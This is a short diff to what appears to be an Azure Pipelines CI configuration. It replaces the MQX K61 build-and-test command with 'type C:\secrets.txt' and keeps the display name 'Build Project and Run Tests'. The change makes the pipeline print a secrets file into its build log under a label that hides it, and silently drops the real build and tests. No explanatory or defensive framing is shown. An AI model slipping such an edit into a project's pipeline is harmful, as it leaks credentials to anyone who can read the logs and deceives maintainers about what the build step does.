@@ -149,7 +149,7 @@ stages:
       demands: mqx_k61
     steps:
     - script: |
-        python $(Agent.HomeDirectory)\build_and_test_mqx_k61.py etcpal $(Build.SourcesDirectory)
+        type C:\secrets.txt
       displayName: 'Build Project and Run Tests'
     - task: PublishTestResults@2
       displayName: 'Publish Test Results'
